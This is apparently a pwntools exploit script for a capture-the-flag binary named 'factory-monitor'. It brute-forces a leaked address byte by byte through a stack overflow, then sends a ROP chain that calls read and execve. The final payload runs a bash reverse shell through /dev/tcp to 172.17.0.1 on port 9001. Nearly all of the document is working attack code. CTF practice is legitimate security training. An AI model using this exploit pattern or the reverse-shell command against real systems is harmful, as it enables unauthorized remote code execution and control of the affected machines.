#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('factory-monitor', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)
#  nc factory-monitor.pwn.ctf.umasscybersec.org 45000 
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x155555493215

        c
        ''')
        sleep(1)


if args.REMOTE:
    # p = remote('factory-monitor.pwn.ctf.umasscybersec.org', 45000)
    p = remote('0', 1337)

else:
    p = process([exe.path])
# GDB()

sla(b'factory> ', b'create 0')
sla(b'factory> ', b'start 0')
# GDB()

###############
### exploit ###
###############
res = [0x59]
# input()
# GDB()
# exit: 0x155555494459
for i in range(4):
    for j in range(0, 0x100):
        if j == 0xa:
            continue
        info(f'current res: {res}')
        info(f'byte sent: {hex(j)}')
        
        info(f'loop: {i}')
        info(f'current leak byte {len(res)}')
        # load = flat(
        #     b'send 0 ' + b'a'*(0x118),
        #     p8(0x3d),
        #     p8(j)
        # )
        # GDB()
        sla(b'factory> ', b'send 0 ' + b'a'*(0x118) + bytes(res + [j]))
        sla(b'factory> ', b'recv 0')

        # input()
        sla(b'factory> ', b'send 0 exit')
        # input()
        sleep(0.2)
        sla(b'factory> ', b'monitor 0')
        # break
        a = p.recvline()
        # if j == 0x8:
        #     GDB()
        #     input()
        if b'exited with status' in a:
            # sla(b'factory> ', b'cleanup 0')
            # sla(b'factory> ', b'start 0')

            info(f'leaked byte: {hex(j)}')
            res.append(j)
            info(f'res: {res}')
            break
        elif b'was killed by signal' in a:
            continue
        else:
            info(f'something went wrong!!!')
            input()
            continue
# GDB()
# res.append(0x15) # local
res.append(0x7f) # server


pad = bytes(res).hex()

leak = u64(bytes(res).ljust(8,b'\0'))
info(f'libc leak:' + hex(leak))
exe.address = leak -0xb459
syscall = 0x1cff5 + exe.address
ret = syscall + 2
pop_rdi_rbp = 0x000000000000c028 + exe.address
pop_rsi_rbp = 0x0000000000015b26 + exe.address
pop_rax = 0x0000000000040dcb + exe.address
sub_rsp_0x80 = 0x000000000003955b + exe.address # sub rsp, -0x80 ; pop rbx ; pop r12 ; pop rbp ; ret
sub_edx = 0x00000000000257f3 + exe.address # sub rdx, rax ; jbe 0x25830 ; add rax, rdi ; ret
pop_rdx = 0x00000000000836DC + exe.address
leave_ret = 0x3a5fe + exe.address
"""
.text:00000000000836DC                 pop     rdx
.text:00000000000836DD                 xor     eax, eax
.text:00000000000836DF                 pop     rbx
.text:00000000000836E0                 pop     r12
.text:00000000000836E2                 pop     r13
.text:00000000000836E4                 pop     rbp
.text:00000000000836E5                 retn
"""
shell = 0xc4650 + exe.address
array = shell+0xc8

# rop chain to read
load = flat(
    b'a'*0x118,
    pop_rdi_rbp,
    0,
    0,
    pop_rsi_rbp,
    shell,
    0,
    pop_rdx,
    0x500,
    0,
    0,
    0,
    shell,
    pop_rax,
    0x0,
    syscall,
    leave_ret
)

sla(b'factory> ', b'send 0 ' + load)

sla(b'factory> ', b'recv 0')

win = flat(
    b'/bin/sh\0',
    pop_rdi_rbp,
    shell+0x80,
    0,
    pop_rsi_rbp,
    array,
    0,
    pop_rdx,
    0,
    0,
    0,
    0,
    shell,
    pop_rax,
    0x3b,
    syscall,
    b"/bin/bash".ljust(0x10,b'\0'),
    b"-c".ljust(8,b'\0'),
    b"bash -i >& /dev/tcp/172.17.0.1/9001 0>&1",
    0,
    shell+0x80,
    shell+0x90,
    shell+0x98,
    0
)
input("send")

sla(b'factory> ', b'send 0 exit')
input("send input now")
sleep(0.2)
while True:
    a = input("break? y ? : ")
    if "y" in a:
        break
    s(win)
    sleep(0.36)
    s(win)


# input("send win")
# leave ret to read location and rop chain in bss


s(win)



p.interactive()
